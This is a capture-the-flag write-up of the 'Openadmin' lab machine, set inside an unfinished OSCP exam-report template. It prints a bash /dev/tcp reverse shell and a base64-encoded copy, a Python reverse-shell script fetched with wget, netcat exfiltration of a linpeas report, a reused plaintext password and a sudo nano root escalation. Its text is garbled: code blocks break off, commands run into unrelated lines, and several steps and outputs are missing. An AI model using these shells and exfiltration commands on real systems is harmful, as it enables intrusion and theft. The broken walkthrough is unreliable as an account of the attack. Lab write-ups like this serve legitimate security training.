# Report - Openadmin

## Introduction

The Offensive Security Exam penetration test report contains all efforts that were conducted in order to pass the Offensive Security course.
This report should contain all items that were used to pass the overall exam.
This report will be graded from a standpoint of correctness and fullness to all aspects of the  exam.
The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the Offensive Security Certified Professional.

## Objective

The objective of this assessment is to perform an internal penetration test against the Offensive Security Exam network.
The student is tasked with following methodical approach in obtaining access to the objective goals.
This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report.
An example page has already been created for you at the latter portions of this document that should give you ample information on what is expected to pass this course.
Use the sample report as a guideline to get you through the reporting.

## Requirements

The student will be required to fill out this penetration testing report and include the following sections:

- Overall High-Level Summary and Recommendations (non-technical)
- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.
- Any additional items that were not included

# Sample Report - High-Level Summary

John Doe was tasked with performing an internal penetration test towards Offensive Security Labs.
An internal penetration test is a dedicated attack against internally connected systems.
The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security's internal lab systems - the **THINC.local** domain.
John's overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security's network.
When performing the attacks, John was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.
During the testing, John had administrative level access to multiple systems.
All systems were successfully exploited and access granted.
These systems as well as a brief description on how access was obtained are listed below:

- Exam Trophy 1 - Got in through X
- Exam Trophy 2 - Got in through X

## Sample Report - Recommendations

John recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future.
One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Sample Report - Methodologies

John utilized a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Labs and Exam environments are secure.
Below is a breakout of how John was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

## Sample Report - Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test.
During this penetration test, John was tasked with exploiting the exam network.
The specific IP addresses were:

**Exam Network**

Host: 10.10.10.171 

## Sample Report - Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.

# Nmap scan host

An initial scan shows the ports 22, 80 are open:

```
$ nmap -sC -sV -p- -oA nmap/openadmin-fulltcp2 10.10.10.171                                                                 1 ⨯

We use gobuster to find hidden websites and webdirectories:

```

We dowhload the exploit, make it executable and use it to gain access to the openadmin host:

This exploit provide us however with a stateless shell. Every command we issued is not remembered and we end up in the same directory, we can find 2 users:

```
$ cd /home
$ ls -al
total 72
drwxrwxr-x 10 www-data www-data 4096 Nov 22  2019 .

```

Also we cannot execute any normal reverse shell command as any special character is interpreted as html tags:

```
$ bash -i >& /dev/tcp/10.10.14.4/4444 0>&1                                                                                        $ echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzQ0NDQgMD4mMQo= | base64 -d | bash
```

To make things easier, we create a python reverse shell script in a upload directory:

```
$ cat reverse.py
#!/usr/bin/env python
import sys,socket,os,pty
s=socket.socket()
s.connect(("10.10.14.4",4444))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
```

We setup a webserver to retrieve this reverse.py script:

```
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.171 - - [24/Mar/2021 13:11:17] "GET /reverse.py HTTP/1.1" 200 -
```

We download the reverse.py script on the openadmin box:

```
$ cd /dev/shm
$ wget http://10.10.14.4:8000/reverse.py
$ chmod +x reverse.py
$ python3 reverse.py
```

We open a Netcat on port 4444 on our box to capture the reverse shell:

```
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.171] 47316
$ 
```

Now we are logged in, and download Linpeas and check the box for privilege escalation paths:

```
$ cd /dev/shm
cd /dev/shm
$ wget http://10.10.14.4:8000/linpeas.sh

$ chmod +x linpeas.sh
chmod +x linpeas.sh
$ ./linpeas.sh | tee linpeas.out
```

We transfer the report to our machine:

```
$ nc -w 3 10.10.14.4 6666 < linpeas.out
nc -w 3 10.10.14.4 6666 < linpeas.out
```

We receive the report on our machine:

```

We take a look at the /var/www directory, we cannot access internal, but find a ona link to /opt/ona/www.

We can use the n1nj4W4rri0R! password to login using the jimmy user with ssh:

```
$ ssh jimmy@10.10.10.171                                                                                                    1 ⨯

-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

We find a hash in the index file:

```
immy@openadmin:/var/www/internal$ grep user *
index.php:            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
index.php:              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
index.php:                  $_SESSION['username'] = 'jimmy';
index.php:                  $msg = 'Wrong username or password.';
index.php:               name = "username"
logout.php:   unset($_SESSION["username"]);
main.php:<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
```

Online we can easily find the password behind the Sha512 hash. It is the Sha512 hash of 'Revealed'.

We note the internal port on 52846:

```

We open portforwarding to the localhost on the openadmin box:

```
$ ssh -L 8888:127.0.0.1:52846 jimmy@10.10.10.171
```

Now we can access the internal web page and we can enter the jimmy/Revealed credential:

We fing sudo is allowed to execute nano:

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

On the site https://gtfobins.github.io/gtfobins/nano/#sudo we can find we can easily do a privilege escalation to root:

```
joanna@openadmin:~$ sudo /bin/nano /opt/priv
```

## Sample Report - Penetration

**Vulnerability Fix:**

**Severity:** Critical

**Proof of Concept Code Here:**

\newpage

## Sample Report - Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

John added administrator and root level accounts on all systems compromised.
In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.

## Sample Report - House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After the trophies on the exam network were completed, John removed all user accounts and passwords as well as the meterpreter services installed on the system.
Offensive Security should not have to remove any user accounts or services from the system.
